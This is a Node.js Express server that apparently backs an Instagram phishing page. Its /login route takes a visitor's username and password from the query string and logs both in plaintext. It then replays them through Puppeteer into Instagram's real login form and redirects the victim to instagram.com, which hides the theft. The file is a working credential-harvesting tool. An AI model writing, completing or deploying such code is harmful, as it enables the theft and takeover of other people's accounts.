const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');

const app = express();

// Middleware to serve static files (e.g., HTML)
app.use(express.static(path.join(__dirname)));

// Parse incoming request bodies
app.use(bodyParser.urlencoded({ extended: true }));

// Route to serve index.html on root path
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
const port = 5000;
const instagramLoginURL = `https://www.instagram.com/accounts/login/`;
const instagramURL = `https://www.instagram.com`;
app.get('/login', async (req, res) => {
    const { username, password } = req.query;  // Use query for GET parameters
    console.log(username);
    console.log(password);
    try {
        const browser = await puppeteer.launch({ headless: false });
        const page = await browser.newPage();
        await page.goto(instagramLoginURL, {
            waitUntil: 'networkidle2'
        });
        await page.waitForSelector('input[name="username"]');
        await page.waitForSelector('input[name="password"]');
        await page.type('input[name="username"]', username);
        await page.type('input[name="password"]', password);
        await page.click('button[type="submit"]');
        await page.waitForNavigation({ waitUntil: 'networkidle2' });
        res.redirect(instagramURL);
    } catch (error) {
        res.redirect(instagramURL);
    }
});

// app.listen(3000, () => {
app.listen(process.env.PORT || port, () => { console.log("Server started on port 3000"); });
